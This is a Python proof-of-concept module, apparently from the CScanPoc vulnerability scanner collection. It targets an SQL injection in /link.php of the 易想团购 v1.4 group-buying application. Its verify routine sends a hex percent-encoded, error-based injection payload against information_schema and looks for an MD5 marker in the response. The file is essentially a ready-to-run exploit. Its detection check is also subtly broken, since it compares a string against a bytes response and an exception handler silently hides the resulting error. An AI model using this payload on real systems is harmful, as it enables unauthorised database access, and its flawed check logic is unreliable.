# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'YXTG_0006'  # 平台漏洞编号，留空
    name = '易想团购 v1.4 /link.php SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-08-08'  # 漏洞公布时间
    desc = '''
        易想团购 v1.4 /link.php SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.2cto.com/article/201308/234400.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '易想团购'  # 漏洞应用名称
    product_version = '1.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6efac4bd-747b-43c3-942d-866b517a4107'
    author = '国光'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/link.php?act=go&url=%27%29%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73"
                       "%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74"
                       "%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C"
                       "%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F"
                       "%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30"
                       "%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69"
                       "%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75"
                       "%70%20%62%79%20%78%29%61%29%23")

            verify_url = '{target}'.format(target=self.target)+payload
            req = urllib.request.Request(verify_url)
            content = urllib.request.urlopen(req).read()

            if '63e1f04640e83605c1d177544a5a0488' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
